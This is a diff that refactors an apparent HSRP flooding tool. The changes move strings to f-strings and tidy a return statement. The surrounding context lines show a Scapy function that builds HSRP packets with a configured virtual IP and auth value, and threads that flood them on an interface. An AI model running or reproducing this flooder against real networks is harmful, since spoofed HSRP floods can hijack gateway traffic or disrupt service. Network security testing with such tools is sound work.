@@ -57,23 +57,23 @@ class Logger:
 
     @staticmethod
     def out(x): 
-        Logger._out('[.] ' + x)
+        Logger._out(f'[.] {x}')
     
     @staticmethod
     def info(x):
-        Logger._out('[?] ' + x)
+        Logger._out(f'[?] {x}')
     
     @staticmethod
     def err(x): 
-        sys.stdout.write('[!] ' + x + '\n')
+        sys.stdout.write(f'[!] {x}' + '\n')
     
     @staticmethod
     def fail(x):
-        Logger._out('[-] ' + x)
+        Logger._out(f'[-] {x}')
     
     @staticmethod
     def ok(x):  
-        Logger._out('[+] ' + x)
+        Logger._out(f'[+] {x}')
 
 def generatePacket():
     ip = IP()
@@ -83,7 +83,7 @@ def generatePacket():
     udp = UDP()
     udp.sport = 1985
     udp.dport = 1985
-    
+
     hsrp = HSRP()
     hsrp.version = 0
     hsrp.opcode = 1
@@ -92,11 +92,10 @@ def generatePacket():
     hsrp.virtualIP = config['virtual-ip']
     hsrp.auth = config['auth']
 
-    hsrppacket = ip / udp / hsrp
-    return hsrppacket
+    return ip / udp / hsrp
 
 def flooder(num):
-    Logger.info('Starting task: {}'.format(num))
+    Logger.info(f'Starting task: {num}')
 
     while stopThreads != True:
         try:
@@ -106,7 +105,7 @@ def flooder(num):
         except KeyboardInterrupt:
             break
 
-    Logger.info('Stopping task: {}'.format(num))
+    Logger.info(f'Stopping task: {num}')
 
 def get_ip_address(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -154,7 +153,7 @@ def parseOptions(argv):
     if args.source: config['source-ip'] = args.source
     else: config['source-ip'] = get_ip_address(config['interface'])
 
-    print('Using source IP address: {}'.format(config['source-ip']))
+    print(f"Using source IP address: {config['source-ip']}")
 
     return args
 
@@ -177,7 +176,9 @@ def main(argv):
         task.daemon = True
         task.start()
 
-    print('[+] Started flooding on dev: {}. Press CTRL-C to stop that.'.format(config['interface']))
+    print(
+        f"[+] Started flooding on dev: {config['interface']}. Press CTRL-C to stop that."
+    )
     try:
         while jobs:
             jobs = [job for job in jobs if job.is_alive()]
